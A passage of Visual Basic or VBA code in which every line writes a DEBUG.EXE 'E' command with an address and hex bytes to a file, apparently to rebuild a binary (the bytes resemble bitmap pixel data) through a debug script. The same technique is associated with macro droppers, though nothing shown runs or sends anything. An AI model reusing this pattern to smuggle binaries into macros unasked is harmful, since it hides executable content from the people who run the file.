Print #hFile, "E 52E0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 16"
Print #hFile, "E 52F0 DE DB 33 4F 67 38 53 6D 44 5C 78 37 4E 68 47 5F"
Print #hFile, "E 5300 73 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 5310 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 5320 F7 EF 2E AF B2 3A 4F 5E 36 4B 60 45 5A 70 76 87"
Print #hFile, "E 5330 9A 7A 8A 9B 5C 6A 7C 4B 58 66 31 3A 43 00 02 07"
Print #hFile, "E 5340 00 00 F4 F4 F4 ED ED ED DE E0 E0 CE D3 D2 BF C4"
Print #hFile, "E 5350 C5 AF B6 B9 00 03 0C 6A 75 83 53 61 74 5E 6E 85"
Print #hFile, "E 5360 5B 6C 87 1E C9 CD 09 F7 EF 09 F7 EF 20 D8 DA 66"
Print #hFile, "E 5370 7B 9A 77 8A AB 76 89 AA 6E 80 9F 60 72 8F 64 75"
Print #hFile, "E 5380 90 76 87 A1 7E 8E A5 76 85 98 92 9F AF BC C8 D4"
Print #hFile, "E 5390 DD E7 F1 E7 F1 F8 EC F2 F7 EC F1 F4 EE F3 F4 F8"
Print #hFile, "E 53A0 FD FC FF FF FE F9 FA F8 FD FE FC 09 F7 EF 09 F7"
Print #hFile, "E 53B0 EF 09 F7 EF 46 F9 F3 F5 F4 F6 E1 E0 E4 E7 E6 EA"
Print #hFile, "E 53C0 DE DD E1 E7 E5 EB EF EF F5 97 D3 D5 09 F7 EF 09"
Print #hFile, "E 53D0 F7 EF 6C B2 BC 09 19 30 1B 2A 4B 30 3E 68 45 54"
Print #hFile, "E 53E0 82 46 56 85 4A 59 8A 4D 5B 8F 50 5B 94 4C 57 91"
Print #hFile, "E 53F0 38 7C A5 09 F7 EF 18 CF D5 46 57 82 43 57 80 41"
Print #hFile, "E 5400 55 7E 47 5C 89 3E 70 97 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 5410 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 5420 09 F7 EF 09 F7 EF 09 F7 EF 1F 84 97 40 55 71 46"
Print #hFile, "E 5430 57 6C AE B6 C3 B3 B9 C0 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 5440 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 5450 09 F7 EF 27 B9 BF 28 43 5D 30 4B 65 44 5D 77 3C"
Print #hFile, "E 5460 54 6C 42 5A 6E 11 E6 E0 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 5470 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 5480 09 F7 EF 09 F7 EF 18 D1 CE 39 4E 5D 52 68 7A 51"
Print #hFile, "E 5490 67 79 76 8A 9B 99 AC BB 84 94 A5 4F 5C 6A 2A 33"
Print #hFile, "E 54A0 3C 00 02 06 00 00 FA FA FA EA EA EA DA DA DA D0"
Print #hFile, "E 54B0 D2 D2 C0 C4 C5 B8 BE C3 00 00 08 4D 58 66 52 61"
Print #hFile, "E 54C0 74 55 67 7E 7A 8D A8 47 BB C7 09 F7 EF 09 F7 EF"
Print #hFile, "E 54D0 3D CC D3 87 9A B5 83 95 B2 80 92 AF 8F A4 C0 8F"
Print #hFile, "E 54E0 A4 BF 71 86 A1 72 89 A3 6A 82 9A 6A 81 97 65 7B"
Print #hFile, "E 54F0 8D 86 9A AB A5 B5 C5 B8 C8 D4 C9 D6 DE C9 D5 DB"
Print #hFile, "E 5500 D7 E0 E4 F6 FE FE FB FF FF FB FE FC FB FD FD 09"
Print #hFile, "E 5510 F7 EF 09 F7 EF 09 F7 EF 37 F8 F2 F5 F1 F6 E8 E4"
Print #hFile, "E 5520 EA D9 D7 DD DA D8 DE D7 D6 DF DE E0 E8 9C DA DE"
Print #hFile, "E 5530 09 F7 EF 09 F7 EF 29 6E 80 02 11 32 23 33 58 40"
Print #hFile, "E 5540 50 7A 41 51 7C 4D 5C 8A 49 57 87 4C 5A 8B 48 56"
Print #hFile, "E 5550 8B 46 54 89 36 7C A2 09 F7 EF 17 CE D4 40 51 82"
Print #hFile, "E 5560 40 52 81 40 52 81 43 54 85 40 54 84 1B C5 CE 09"
Print #hFile, "E 5570 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 5580 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 3C 5D 80"
Print #hFile, "E 5590 21 34 59 2E 40 5D 9D A7 B8 AA B1 BA 3D E3 DF 09"
Print #hFile, "E 55A0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 55B0 EF 09 F7 EF 09 F7 EF 37 A2 B0 35 53 6C 37 53 6B"
Print #hFile, "E 55C0 49 64 79 43 5C 70 3B 54 64 1C C8 C7 09 F7 EF 09"
Print #hFile, "E 55D0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 55E0 EF 09 F7 EF 09 F7 EF 09 F7 EF 0D EE E7 64 78 83"
Print #hFile, "E 55F0 66 7C 88 2E 46 52 58 72 7E 81 9B A7 95 AA B9 6A"
Print #hFile, "E 5600 7B 88 68 73 7B 00 01 05 00 00 F5 F5 F5 ED ED ED"
Print #hFile, "E 5610 DF DF DF D1 D3 D3 BF C0 C4 B7 BB C0 00 00 0A 71"
Print #hFile, "E 5620 7C 8A 6F 7E 91 72 84 9B 73 87 A0 6D 8F A8 0F F0"
Print #hFile, "E 5630 EA 09 F7 EF 50 B4 C2 8D 9F B6 A0 B4 CD 9C AF CA"
Print #hFile, "E 5640 85 9A B5 87 9E B8 7B 92 AC 86 9F B9 83 9F B7 4B"
Print #hFile, "E 5650 66 7B 63 7B 91 6E 86 98 82 99 A9 99 AC B9 B1 C2"
Print #hFile, "E 5660 CB C3 D0 D8 D2 DE E4 EB F4 F8 F9 FE FF F7 FC FB"
Print #hFile, "E 5670 CF FE FC 09 F7 EF 09 F7 EF 09 F7 EF 45 F8 F3 FA"
Print #hFile, "E 5680 F6 FB E3 DF E5 D4 D2 D8 CE CD D6 C8 CA D2 CB CD"
Print #hFile, "E 5690 D7 98 D7 DC 09 F7 EF 09 F7 EF 14 59 6F 0D 1D 42"
Print #hFile, "E 56A0 2F 40 67 43 53 7D 43 53 7E 49 58 86 44 52 83 42"
Print #hFile, "E 56B0 50 81 45 53 87 44 52 86 2B 8F AD 09 F7 EF 16 CE"
Print #hFile, "E 56C0 D4 40 51 84 41 52 85 42 53 86 45 56 89 44 55 88"
Print #hFile, "E 56D0 2E 92 AF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 56E0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 1C B8"
Print #hFile, "E 56F0 C3 3B 4F 78 27 3C 62 23 35 54 90 9C AE A9 B0 B9"
Print #hFile, "E 5700 71 CD CF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 5710 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 47 72 8B 36 54"
Print #hFile, "E 5720 6D 39 55 6D 4F 6A 7E 43 5D 6D 44 5D 6D 30 A7 AC"
Print #hFile, "E 5730 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 5740 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 5750 EF 52 75 7C 51 66 6E 21 38 40 42 5F 68 79 97 A2"
Print #hFile, "E 5760 98 AF BE 6F 80 8D 53 60 68 00 03 07 00 00 F6 F6"
Print #hFile, "E 5770 F6 F3 F3 F3 E3 E3 E3 D2 D4 D4 BE BF C3 B1 B5 BA"
Print #hFile, "E 5780 00 01 0B 85 90 9E 85 94 A7 80 92 A9 74 88 A1 67"
Print #hFile, "E 5790 7C 97 2D AF B9 0C ED E7 4D 6B 83 6B 7D 94 77 8B"
Print #hFile, "E 57A0 A4 93 A7 C0 9B B1 CA 81 99 B1 78 90 A8 85 9F B7"
Print #hFile, "E 57B0 6E 88 A0 5C 77 8C 62 7A 90 5C 74 86 6E 85 95 82"
Print #hFile, "E 57C0 95 A2 99 A9 B5 B8 C4 CE CA D5 DD D6 E0 E7 EF F5"
Print #hFile, "E 57D0 FA EF F4 F7 BB F9 FA 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 57E0 45 F8 F3 F9 F5 FA E2 E0 E6 D0 CE D4 C7 C6 CF C6"
Print #hFile, "E 57F0 C7 D1 BC BE C9 A5 C6 CF 09 F7 EF 09 F7 EF 02 44"
Print #hFile, "E 5800 5A 22 31 58 41 51 7B 48 58 82 48 58 83 48 57 85"
Print #hFile, "E 5810 44 52 83 3E 4B 7F 45 53 88 45 53 88 26 A5 BB 09"
Print #hFile, "E 5820 F7 EF 18 CF D6 45 55 8A 47 57 8C 49 5A 8D 47 58"
Print #hFile, "E 5830 8B 47 58 89 47 58 89 11 E4 E3 09 F7 EF 09 F7 EF"
Print #hFile, "E 5840 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 5850 F7 EF 28 65 84 2F 44 6A 23 38 5E 17 29 48 83 8F"
Print #hFile, "E 5860 A1 A0 A6 B1 A8 AE B5 1F F1 EA 09 F7 EF 09 F7 EF"
Print #hFile, "E 5870 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 26 C7 CB 49"
Print #hFile, "E 5880 67 82 3E 5C 75 41 5E 73 59 74 88 45 5F 6F 45 5E"
Print #hFile, "E 5890 6E 4A 7F 8A 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 58A0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 58B0 F7 EF 09 F7 EF 36 81 87 34 49 51 10 27 2F 46 63"
Print #hFile, "E 58C0 6C 76 92 9D 9B B2 C1 8B 9C A9 4F 5C 64 00 02 06"
Print #hFile, "E 58D0 00 00 F0 F0 F0 EC EC EC DB DB DB CF D1 D1 C5 C6"
Print #hFile, "E 58E0 CA B4 B8 BD 00 00 08 89 94 A2 7B 8A 9D 51 63 7A"
Print #hFile, "E 58F0 5C 70 89 67 7C 97 63 78 93 49 88 9B 44 55 6F 4C"
Print #hFile, "E 5900 5E 75 53 68 7E 75 89 A2 89 9F B8 9B B1 CA 86 9E"
Print #hFile, "E 5910 B6 72 8C A4 78 92 AA 5C 77 8C 64 7D 91 5E 76 88"
Print #hFile, "E 5920 70 87 97 74 87 96 79 89 96 9D AB B7 BA C6 D0 C9"
Print #hFile, "E 5930 D2 DC DD E2 EB E0 E3 EB D8 EB EF 09 F7 EF 09 F7"
Print #hFile, "E 5940 EF 09 F7 EF 55 F9 F4 F8 F4 F9 E8 E6 EC C8 C8 CE"
Print #hFile, "E 5950 BC BD C7 C5 C7 D2 B1 B4 C2 AB B0 BF 41 D9 DA 1C"
Print #hFile, "E 5960 D1 D1 00 05 27 39 48 6F 4A 5A 84 49 59 84 4E 5D"
Print #hFile, "E 5970 8B 48 56 86 48 56 87 42 4F 83 42 50 85 42 50 85"
Print #hFile, "E 5980 17 CE D5 09 F7 EF 18 CF D6 47 57 8C 48 58 8D 48"
Print #hFile, "E 5990 59 8C 49 5A 8B 49 5B 8A 49 5A 8B 39 81 A4 09 F7"
Print #hFile, "E 59A0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 59B0 09 F7 EF 14 BF C6 32 47 6D 34 4A 6E 22 38 5C 10"
Print #hFile, "E 59C0 22 3F 75 81 93 93 9C A6 A1 A7 AE 79 D5 D5 09 F7"
Print #hFile, "E 59D0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 59E0 3F 91 A2 4D 6C 85 48 67 7E 48 65 7A 60 7B 8F 4A"
Print #hFile, "E 59F0 64 75 3B 54 64 51 6B 79 32 D1 D1 09 F7 EF 09 F7"
Print #hFile, "E 5A00 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 5A10 09 F7 EF 09 F7 EF 09 F7 EF 2C 77 7D 22 37 3F 0B"
Print #hFile, "E 5A20 22 2A 5E 79 83 7E 9A A5 9E B5 C4 94 A5 B2 41 4C"
Print #hFile, "E 5A30 54 00 00 04 00 00 F7 F7 F7 F1 F1 F1 DA DA DA CF"
Print #hFile, "E 5A40 D1 D1 C6 C7 CB B2 B6 BB 00 00 08 81 8C 9A 82 91"
Print #hFile, "E 5A50 A4 48 5A 71 49 5D 76 4D 62 7D 59 6E 89 7D 93 AC"
Print #hFile, "E 5A60 76 87 A1 58 6A 81 51 66 7C 51 66 7C 7E 95 AB 78"
Print #hFile, "E 5A70 8F A5 8B A3 B9 86 9E B4 45 60 75 69 84 99 65 7E"
Print #hFile, "E 5A80 92 69 81 95 75 8B 9D 65 77 88 54 64 75 75 82 92"
Print #hFile, "E 5A90 A5 B0 BE C1 CA D8 CA D0 DD CF D3 DE D4 D6 E0 22"
Print #hFile, "E 5AA0 F3 ED 09 F7 EF 09 F7 EF 83 FA F7 F6 F5 F7 EB EA"
Print #hFile, "E 5AB0 EE C5 C5 CB B3 B4 BE BA BB C9 A3 A8 B7 A3 A9 BC"
Print #hFile, "E 5AC0 9C A3 B7 4E 57 72 12 1E 42 48 56 80 49 59 84 45"
Print #hFile, "E 5AD0 55 80 4D 5C 8A 45 53 83 47 55 86 45 52 86 3E 4C"
Print #hFile, "E 5AE0 81 41 4F 84 10 E3 E2 09 F7 EF 18 CF D6 46 57 8A"
Print #hFile, "E 5AF0 45 56 89 44 55 88 4A 5C 8B 4B 5E 8B 4B 5D 8C 49"
Print #hFile, "E 5B00 5B 8A 20 BC C9 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 5B10 EF 09 F7 EF 0C ED E8 30 60 80 3C 52 76 48 5E 81"
Print #hFile, "E 5B20 39 4F 72 1A 2F 4B 60 6E 80 92 9B A8 9B A2 AB B4"
Print #hFile, "E 5B30 BA C1 31 E6 E1 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 5B40 EF 23 DC DC 56 72 8A 50 6E 87 4A 66 7E 4A 67 7C"
Print #hFile, "E 5B50 61 7C 90 54 6E 7F 36 4F 5F 4E 67 77 6E 96 A2 13"
Print #hFile, "E 5B60 DA D6 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 5B70 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 2B 3F 4A"
Print #hFile, "E 5B80 1D 31 3C 1A 30 3B 66 81 8B 8B A5 B1 A3 B8 C7 7D"
Print #hFile, "E 5B90 8E 9B 26 31 39 00 00 06 00 00 F3 F3 F3 EF EF EF"
Print #hFile, "E 5BA0 DA DA DA CD CF CF C4 C5 C9 B5 B9 BE 00 01 0B 8E"
Print #hFile, "E 5BB0 99 A7 7F 8E A1 4A 5C 73 44 58 71 55 6A 85 47 5C"
Print #hFile, "E 5BC0 77 53 69 82 7D 8E A8 81 93 AA 5A 6F 84 4D 62 77"
Print #hFile, "E 5BD0 54 6B 81 5E 75 8B 75 8D A3 73 8B A1 5F 7A 8F 63"
Print #hFile, "E 5BE0 7E 93 5A 73 87 68 80 94 6E 83 98 5B 6F 81 44 53"
Print #hFile, "E 5BF0 66 50 5E 70 81 8D 9F A6 B0 C2 BC C3 D4 C3 C7 D9"
Print #hFile, "E 5C00 C6 C9 D7 58 DF DF 09 F7 EF 09 F7 EF C2 EE EF EC"
Print #hFile, "E 5C10 EB ED E7 E6 EA C7 C7 CD B6 B7 C1 AF B2 C0 9C A2"
Print #hFile, "E 5C20 B5 9E A4 BB 86 8D A6 38 42 60 33 40 66 4C 5A 84"
Print #hFile, "E 5C30 46 56 80 44 54 7F 4A 59 87 44 52 82 47 55 86 46"
Print #hFile, "E 5C40 53 87 49 57 8B 4B 59 8D 11 E4 E4 09 F7 EF 23 BF"
Print #hFile, "E 5C50 CD 4D 5E 8F 4B 5C 8D 49 5A 8B 4C 5F 8C 4B 5E 89"
Print #hFile, "E 5C60 4A 5D 8A 49 5C 89 48 5B 88 20 BC C8 09 F7 EF 09"
Print #hFile, "E 5C70 F7 EF 09 F7 EF 0C ED E8 3B 79 96 46 5C 80 38 4E"
Print #hFile, "E 5C80 71 46 5D 7D 4C 63 83 3B 50 6B 4B 5A 6D 90 9B A9"
Print #hFile, "E 5C90 94 9D A7 A4 AD B6 90 A8 B0 1B E0 DB 09 F7 EF 09"
Print #hFile, "E 5CA0 F7 EF 10 F1 EB 5D 9D AD 5C 78 90 4D 6C 83 45 61"
Print #hFile, "E 5CB0 79 4B 68 7D 61 7B 8C 61 7B 8C 3D 56 66 51 6A 7A"
Print #hFile, "E 5CC0 77 91 9F 3D 64 71 17 9A 9D 0B EC E6 09 F7 EF 09"
Print #hFile, "E 5CD0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 0E 9E"
Print #hFile, "E 5CE0 9E 1F 33 3E 21 35 40 3A 50 5B 6C 85 8F 8A A2 AE"
Print #hFile, "E 5CF0 A3 B7 C8 76 85 95 32 3C 46 00 00 06 00 00 F6 F6"
Print #hFile, "E 5D00 F6 F3 F3 F3 DF DF DF CE D0 D0 C1 C2 C6 B2 B6 BB"
Print #hFile, "E 5D10 00 00 09 88 93 A1 86 95 A8 3F 51 68 44 58 71 81"
Print #hFile, "E 5D20 96 B1 73 88 A3 3B 51 6A 47 58 72 71 83 9A 6B 80"
Print #hFile, "E 5D30 95 5A 6F 84 48 60 74 35 4D 61 73 8C A0 8E A7 BB"
Print #hFile, "E 5D40 63 7E 92 6B 86 9A 58 70 86 61 79 8D 5A 6F 84 56"
Print #hFile, "E 5D50 69 7E 46 57 6C 3A 49 5C 58 67 7A 7F 8A 9E 9C A2"
Print #hFile, "E 5D60 B9 A2 A7 BC AE B2 C4 A7 B9 C6 5F D7 D8 95 D3 D5"
Print #hFile, "E 5D70 DC DD E1 E4 E6 E7 E0 E1 E5 C2 C5 CA B6 B8 C3 A6"
Print #hFile, "E 5D80 AB BA 9B A2 B6 95 9C B7 65 6D 8B 25 2F 51 4A 57"
Print #hFile, "E 5D90 7D 48 57 7E 49 5A 81 4C 5C 86 4E 5E 89 50 5F 8D"
Print #hFile, "E 5DA0 52 60 90 51 5F 90 56 65 96 56 65 96 50 6E 9C 37"
Print #hFile, "E 5DB0 9C B6 52 64 93 51 63 92 4F 61 90 4E 61 8E 4F 60"
Print #hFile, "E 5DC0 8B 4D 5F 88 4A 5B 86 4A 5B 86 4A 5B 86 48 59 84"
Print #hFile, "E 5DD0 35 7E 9C 25 A5 B6 29 A9 B9 3A 69 89 50 63 89 4E"
Print #hFile, "E 5DE0 61 86 41 55 78 40 55 75 43 58 77 54 69 84 44 53"
Print #hFile, "E 5DF0 66 79 86 96 89 95 A1 97 A1 AB 84 8E 98 61 6D 77"
Print #hFile, "E 5E00 36 99 9E 36 B6 BA 68 A7 B4 67 7F 95 60 7A 92 4D"
Print #hFile, "E 5E10 69 81 46 63 78 55 73 86 60 7A 8B 6B 85 95 46 5F"
Print #hFile, "E 5E20 6F 55 6E 7E 74 8D 9D 3C 55 65 26 3D 4D 1E 35 44"
Print #hFile, "E 5E30 36 76 80 39 AE B3 30 B3 B5 36 B8 BA 1B 9D 9F 1F"
Print #hFile, "E 5E40 6B 72 18 2B 38 20 33 40 27 3B 46 5A 6E 79 77 8D"
Print #hFile, "E 5E50 99 8B A1 AD A2 B4 C5 6D 7C 8C 45 4F 59 00 00 06"
Print #hFile, "E 5E60 00 00 F3 F3 F3 EF EF EF DD DD DD CE D0 D0 C1 C2"
Print #hFile, "E 5E70 C6 B4 B8 BD 00 00 08 7E 89 97 97 A6 B9 4A 5C 73"
Print #hFile, "E 5E80 3B 4F 68 5E 73 8E 8D A2 BD 8E A4 BD 61 72 8C 53"
Print #hFile, "E 5E90 65 7C 5A 6F 84 68 7D 92 46 5E 72 36 4E 62 63 7C"
Print #hFile, "E 5EA0 90 71 8A 9E 6D 88 9C 5F 7A 8E 65 7D 93 60 78 8E"
Print #hFile, "E 5EB0 46 5E 72 4D 62 77 49 5C 71 2D 3E 53 40 50 67 65"
Print #hFile, "E 5EC0 73 8A 6E 78 90 77 7D 94 90 95 AA AD B2 C1 BE C0"
Print #hFile, "E 5ED0 CB CC CF D4 E1 E2 E6 EC EE EF DD DE E2 B9 BB C3"
Print #hFile, "E 5EE0 AC AE B9 9C A0 B2 98 9D B6 8C 94 B2 54 5D 7F 29"
Print #hFile, "E 5EF0 35 59 52 60 84 43 53 78 4F 61 86 57 68 8F 56 66"
Print #hFile, "E 5F00 90 5F 6F 9A 61 70 9E 5E 6D 9B 57 67 95 55 65 93"
Print #hFile, "E 5F10 50 63 90 4D 60 8D 4B 5E 8B 4A 5D 88 49 5C 87 4A"
Print #hFile, "E 5F20 5D 88 51 63 8C 4D 5F 88 49 5B 84 48 5A 83 49 5A"
Print #hFile, "E 5F30 85 47 59 82 42 54 7D 3D 50 76 35 48 6E 3B 4E 73"
Print #hFile, "E 5F40 43 56 7B 4A 5E 81 5E 73 93 4A 5F 7E 2E 44 60 5A"
Print #hFile, "E 5F50 6E 87 46 57 6C 5C 6A 7C 7F 8C 9A 8C 9A A6 6A 78"
Print #hFile, "E 5F60 84 58 66 72 52 63 70 68 7B 8A 77 8D 9F 5B 74 88"
Print #hFile, "E 5F70 60 7B 90 4E 6B 80 4C 6A 7D 63 7F 90 62 7C 8C 70"
Print #hFile, "E 5F80 8A 9A 48 61 71 55 6E 7E 6C 85 95 30 49 59 25 3C"
Print #hFile, "E 5F90 4C 1F 36 46 3D 54 63 5A 71 80 63 78 87 73 89 95"
Print #hFile, "E 5FA0 38 4E 5A 23 39 45 31 44 51 28 3B 48 2B 3F 4A 6A"
Print #hFile, "E 5FB0 7E 89 7D 93 9F 95 AA B9 A1 B3 C4 4A 5A 6A 38 42"
Print #hFile, "E 5FC0 4C 00 00 06 00 00 F7 F7 F7 ED ED ED E4 E4 E4 CE"
Print #hFile, "E 5FD0 D0 D0 C1 C2 C6 B8 BC C1 00 00 08 86 91 9F 89 98"
Print #hFile, "E 5FE0 AB 5F 71 88 63 77 90 53 68 83 56 6B 86 85 9B B4"
Print #hFile, "E 5FF0 A0 B1 CB 76 88 9F 65 7A 8F 51 69 7D 43 5B 6F 2F"
Print #hFile, "E 6000 47 5B 5E 77 8B 65 7E 92 6F 88 9C 61 7A 8E 62 7B"
Print #hFile, "E 6010 8F 5C 75 89 4E 65 7B 3A 4F 65 42 57 6D 46 58 6F"
Print #hFile, "E 6020 3F 50 6A 64 73 8D 57 62 7D 6D 77 8F 90 96 AD B8"
Print #hFile, "E 6030 BF D0 CC D0 DB D2 D5 DD E3 E6 EB E8 E9 ED DD E0"
Print #hFile, "E 6040 E5 B4 B7 BF AD B0 BE 98 9E B1 8E 95 B0 70 79 9A"
Print #hFile, "E 6050 33 3F 63 3A 47 6D 49 59 7D 5C 6C 90 6B 7E A1 6B"
Print #hFile, "E 6060 7D A2 61 72 99 58 68 92 53 63 8D 50 60 8B 4B 5C"
Print #hFile, "E 6070 87 4A 5B 86 47 5A 85 49 5D 86 4C 60 89 4D 61 8A"
Print #hFile, "E 6080 4B 60 86 49 5E 84 4C 5F 85 4C 5D 84 4B 5C 83 4A"
Print #hFile, "E 6090 5B 82 48 58 82 44 54 7E 3E 4E 78 3A 4B 72 3A 4B"
Print #hFile, "E 60A0 72 37 49 6E 2F 42 65 39 4C 6D 55 69 88 5F 74 90"
Print #hFile, "E 60B0 48 5D 79 31 45 5E 5A 6B 80 5A 6A 7B 66 76 87 7E"
Print #hFile, "E 60C0 8D 9D 69 78 88 50 60 70 46 59 68 55 69 7A 78 8E"
Print #hFile, "E 60D0 A0 5E 77 8B 5F 7A 8E 50 6B 7F 49 64 78 5F 7B 8C"
Print #hFile, "E 60E0 69 83 93 6F 89 99 4C 64 76 5A 72 84 51 6A 7A 27"
Print #hFile, "E 60F0 40 50 1A 31 41 2A 41 51 3B 52 62 50 67 76 60 75"
Print #hFile, "E 6100 84 80 95 A4 4D 63 6F 52 68 74 2F 42 4F 17 2A 37"
Print #hFile, "E 6110 4F 62 6F 6F 82 8F 8B A1 AD 9B B0 BF 86 9A AC 4F"
Print #hFile, "E 6120 5F 70 55 5E 6B 00 00 08 00 00 F6 F6 F6 EB EB EB"
Print #hFile, "E 6130 E2 E2 E2 CD CF CF C1 C2 C6 B8 BC C1 00 00 08 91"
Print #hFile, "E 6140 9C AA 84 93 A6 6C 7E 95 7C 90 A9 70 85 A0 55 6A"
Print #hFile, "E 6150 85 4A 60 79 65 76 90 83 98 AE 70 85 9A 69 81 95"
Print #hFile, "E 6160 47 5F 73 25 3D 51 54 6D 81 5E 77 8B 6E 87 9B 67"
Print #hFile, "E 6170 80 94 78 91 A5 5B 74 88 3D 54 6A 30 47 5D 40 54"
Print #hFile, "E 6180 6D 5D 71 8A 66 7A 93 5C 6D 87 59 65 81 78 83 9E"
Print #hFile, "E 6190 97 9F B6 B7 BE D1 D3 D9 E6 D9 DE E7 E1 E4 E9 EC"
Print #hFile, "E 61A0 EF F4 D5 D8 DD BB BD C7 A3 A6 B5 94 9B AF 88 91"
Print #hFile, "E 61B0 AC 5A 65 85 35 42 68 54 64 89 67 77 9B 6C 7D 9E"
Print #hFile, "E 61C0 6B 7E A1 62 74 99 5A 6B 92 55 66 8D 53 63 8D 50"
Print #hFile, "E 61D0 60 8A 4D 5F 88 4C 5E 87 49 5D 86 4A 5F 85 4C 61"
Print #hFile, "E 61E0 87 4E 64 88 4E 64 88 4E 64 88 52 63 8A 4F 60 87"
Print #hFile, "E 61F0 49 5A 81 44 55 7C 40 50 7A 3D 4D 77 3C 4D 74 3B"
Print #hFile, "E 6200 4C 73 39 4B 70 34 47 6A 31 44 67 34 48 67 3E 52"
Print #hFile, "E 6210 71 48 5D 79 4D 62 7D 4E 62 7B 3F 52 67 5B 6C 7F"
Print #hFile, "E 6220 5A 6B 7E 63 75 86 5E 70 81 41 53 64 30 44 55 59"
Print #hFile, "E 6230 70 80 77 8F A1 5E 78 89 66 7F 93 56 72 83 47 63"
Print #hFile, "E 6240 74 5E 7B 8A 6A 84 94 6A 84 94 45 5D 6F 43 5B 6D"
Print #hFile, "E 6250 44 5D 6D 30 49 59 1E 35 45 1F 36 46 2F 46 56 48"
Print #hFile, "E 6260 5F 6F 67 7C 8B 82 97 A6 58 6D 7C 5A 70 7C 58 6B"
Print #hFile, "E 6270 78 3B 4E 5B 5E 71 7E 80 93 A0 A2 B8 C4 92 A7 B6"
Print #hFile, "E 6280 52 66 78 31 43 54 51 5D 69 00 00 07 00 00 F6 F6"
Print #hFile, "E 6290 F6 E9 E9 E9 DF DF DF CD CF CF C1 C2 C6 B6 BA BF"
Print #hFile, "E 62A0 00 00 09 A0 AB B9 91 A0 B3 65 77 8E 70 84 9D 68"
Print #hFile, "E 62B0 7D 98 65 7A 95 59 6F 88 3B 4C 66 54 69 7F 7C 91"
Print #hFile, "E 62C0 A7 80 97 AD 49 60 76 1C 33 49 4D 66 7A 63 7C 90"
Print #hFile, "E 62D0 7F 98 AC 7B 94 A8 6F 88 9C 45 5E 72 2F 47 5D 4A"
Print #hFile, "E 62E0 62 78 5D 73 8C 5E 74 8D 5D 72 8D 4D 60 7B 4A 58"
Print #hFile, "E 62F0 74 6D 7A 94 89 94 AA A2 AC BE C9 D1 DE D9 DE E7"
Print #hFile, "E 6300 D9 DB E3 E7 E9 F1 CF D1 D9 B9 BD C8 99 9E AD 8D"
Print #hFile, "E 6310 94 A8 73 7C 97 47 54 74 49 59 7D 6C 7C A1 79 89"
Print #hFile, "E 6320 AD 74 84 A8 68 7A 9F 5F 71 96 5B 6C 93 5B 6C 93"
Print #hFile, "E 6330 5A 6A 94 57 67 91 4F 61 8A 50 62 8B 4D 62 88 4D"
Print #hFile, "E 6340 62 88 4D 62 88 4E 64 88 50 66 8A 52 68 8B 54 66"
Print #hFile, "E 6350 8B 51 63 88 4C 5D 84 45 56 7D 3F 50 77 3B 4C 73"
Print #hFile, "E 6360 39 4A 71 39 4A 71 34 46 6B 39 4C 6F 32 45 68 2A"
Print #hFile, "E 6370 3E 5D 2F 43 62 36 4B 67 46 5B 76 5C 72 8B 2D 42"
Print #hFile, "E 6380 58 53 66 7B 4E 61 76 49 5D 6F 41 55 67 27 3D 4F"
Print #hFile, "E 6390 20 36 48 53 6B 7D 76 8E A0 5D 77 88 6D 87 98 5E"
Print #hFile, "E 63A0 78 89 47 61 72 61 7B 8B 6F 89 99 67 81 91 44 5C"
Print #hFile, "E 63B0 6E 2E 46 58 34 4C 5E 33 4B 5D 22 38 4A 1A 30 42"
Print #hFile, "E 63C0 29 40 50 46 5D 6D 6B 7F 90 7A 8F 9E 59 6E 7D 4C"
Print #hFile, "E 63D0 61 70 73 86 95 58 6B 7A 67 7A 87 8B 9E AB 9B AE"
Print #hFile, "E 63E0 BD 7D 91 A2 2B 41 53 1D 31 42 4D 5B 67 00 00 07"
Print #hFile, "E 63F0 00 00 F7 F7 F7 E9 E9 E9 DE DE DE CD CF CF C1 C2"
Print #hFile, "E 6400 C6 B3 B7 BC 00 00 0A AC B7 C5 A3 B2 C5 74 86 9D"
